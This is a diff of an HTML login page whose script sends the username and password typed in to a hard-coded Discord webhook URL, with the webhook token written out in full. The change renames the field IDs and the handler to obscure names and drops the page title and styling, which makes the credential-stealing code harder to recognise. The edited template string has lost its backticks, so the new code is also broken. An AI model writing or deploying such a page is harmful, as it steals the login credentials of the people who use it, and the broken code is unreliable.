@@ -2,18 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login Page</title>
+  <title>d</title>
   <style>
     body {
-      background: #111;
-      color: #fff;
-      font-family: 'Arial', sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
+
     }
 
     h1 {
@@ -34,7 +26,7 @@
     }
 
     button {
-      padding: 12px 30px;
+      padding: 12px 30px; 
       font-size: 16px;
       border: none;
       border-radius: 5px;
@@ -53,32 +45,39 @@
 
   <h1>Welcome Back!</h1>
 
-  <input type="text" id="username" placeholder="Enter username">
-  <input type="password" id="password" placeholder="Enter password">
-  <button onclick="login()">Log In</button>
+  <input type="text" id="u_i_x" placeholder="Enter username">
+  <input type="password" id="p_s_w" placeholder="Enter password">
+  <button id="xbtn">Log In</button>
 
   <script>
-    function login() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
+    (function () {
+      const u = document.getElementById("u_i_x");
+      const p = document.getElementById("p_s_w");
+      const b = document.getElementById("xbtn");
 
-      if (user && pass) {
-        alert("Username: " + user + "\nPassword: " + pass);
+      function hndlr() {
+        const uVal = u.value;
+        const pVal = p.value;
 
-        // Send a funny message to the Discord webhook
-        fetch("https://discord.com/api/webhooks/1375945799011401789/3Pj5HOb44__aN5LAHa9g_2oTsdfzzGRgHhb6CLZe4nos2wYoFuvlXbhZPzQ9pW2FZSa-", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: `👤 User **${user}** just said they’re so sigma with password **${pass}** 💀`
-          })
-        });
-      } else {
-        alert("⚠️ Fill in both fields, sigma warrior.");
+        if (uVal && pVal) {
+          alert("Username: " + uVal + "\nPassword: " + pVal);
+
+          fetch("https://discord.com/api/webhooks/1375945799011401789/3Pj5HOb44__aN5LAHa9g_2oTsdfzzGRgHhb6CLZe4nos2wYoFuvlXbhZPzQ9pW2FZSa-", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              content: 👤 User **${uVal}** just said they’re so sigma with password **${pVal}** 💀
+            })
+          });
+        } else {
+          alert("⚠️ Fill in both fields, sigma warrior.");
+        }
       }
-    }
+
+      b.addEventListener("click", hndlr);
+    })();
   </script>
 
 </body>
